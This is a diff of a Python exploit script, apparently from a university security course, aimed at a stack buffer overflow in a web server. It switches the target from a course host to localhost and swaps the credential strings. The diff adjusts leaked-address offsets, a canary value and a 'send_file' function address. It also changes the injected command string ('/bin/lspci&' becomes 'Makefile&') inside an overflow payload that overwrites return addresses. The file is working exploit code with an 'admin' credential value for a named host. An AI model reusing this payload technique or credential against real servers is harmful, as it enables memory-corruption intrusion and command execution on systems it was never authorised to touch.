@@ -1,7 +1,7 @@
 
 
-url = "http://project-2.csec.chatzi.org:8000"
-pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
+url = "http://localhost:8000"
+pas="test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"
 
 
 from requests import Request, Session
@@ -58,7 +58,7 @@ set_variables()
 
 
 guessed_address=last - 0xB8	#vale to teleutaio argument 
-send_file = semi_last - 0x4f85 #vale to proteleutaio argument 
+send_file = 0x56645F57 #vale to proteleutaio argument 
 var_c0_value = canery	#vale to 4o apo to telos
 
 
@@ -78,10 +78,10 @@ print(hex(guessed_address))
 
 
 
-shellcode = "/bin/lspci&" 
+shellcode = "Makefile&" 
 
 data = shellcode 
-data +=  81*"!" 
+data +=  83*"!" 
 data += transform_address(guessed_address + 140 + 4)
 data += 8*"!" + 4*"-" + 4*"-"+4*"!"
 data += transform_address(guessed_address + 8)
